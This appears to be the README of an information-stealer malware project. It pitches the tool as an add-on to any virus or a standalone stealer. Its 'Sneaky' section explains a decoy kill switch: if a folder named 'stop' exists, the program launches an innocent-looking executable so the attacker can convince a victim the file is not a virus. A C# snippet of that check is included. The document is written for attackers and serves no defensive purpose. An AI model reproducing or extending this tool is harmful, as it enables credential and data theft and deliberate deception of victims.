Add-on to any virus you throw at it or just an actual stealer
that steals info.

# Sneaky
When an attacker wants to prove their victim this program isnt a virus
theres a kill switch which opens a different program, in order to do this
you need to make a directory named ```stop``` in the C: drive or where ever you want it to be and then 
put the directory of your innocent program on here. 
```csharp
               if (Directory.Exists(folderPath))
                {
                    Process.Start(@"C:\Users\Admin\Downloads\geometric.exe");
                }
```
